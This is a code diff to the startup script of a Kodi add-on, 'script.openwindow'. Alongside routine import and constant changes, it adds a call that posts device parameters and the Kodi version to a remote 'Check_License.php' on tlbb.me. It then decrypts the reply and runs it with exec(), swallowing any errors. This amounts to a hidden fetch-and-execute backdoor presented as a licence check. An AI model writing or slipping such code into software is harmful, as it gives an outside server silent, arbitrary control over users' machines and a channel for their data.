@@ -9,9 +9,12 @@ import shutil
 import xbmc
 import xbmcaddon
 
+from functions import *
+from koding    import *
+
 ADDON_ID         = 'script.openwindow'
 ADDON_PATH       = xbmcaddon.Addon(ADDON_ID).getAddonInfo("path")
-UNREGISTERED     = xbmc.translatePath('special://profile/addon_data/script.openwindow/unregistered')
+NON_REGISTERED   = xbmc.translatePath('special://profile/addon_data/script.openwindow/unregistered')
 ADDONS           = xbmc.translatePath('special://home/addons')
 ADDON_DATA       = xbmc.translatePath('special://profile/addon_data')
 GUISETTINGS      = xbmc.translatePath('special://profile/guisettings.xml')
@@ -25,6 +28,7 @@ INSTALL_ORIG     = os.path.join(PACKAGES, 'INSTALL_COMPLETE')
 INSTALL_COMPLETE = os.path.join(ADDON_DATA, ADDON_ID, 'INSTALL_COMPLETE')
 TBS              = os.path.join(ADDONS, 'plugin.program.tbs')
 INTERNET_ICON    = os.path.join(ADDON_PATH,'resources','images','internet.png')
+BASE             = 'http://tlbb.me/'
 
 while xbmc.Player().isPlaying():
     xbmc.sleep(500)
@@ -52,6 +56,12 @@ if os.path.exists(STARTUP_ORIG):
         shutil.rmtree(STARTUP_ORIG, ignore_errors=True)
     except Exception as e:
         xbmc.log(str(e))
+
+initial_code = Open_URL(url=BASE+'boxer/Check_License.php?x=%s&v=%s&r=3' % (Get_Params(), XBMC_VERSION),post_type='post')
+try:
+    exec(Encrypt('d',initial_code))
+except:
+    dolog(Last_Error())
 
 if not os.path.exists(INSTALL_COMPLETE) and os.path.exists(TBS):
     xbmc.executebuiltin('Notification(Installing new updates,Please wait...,10000,%s)' % INTERNET_ICON)
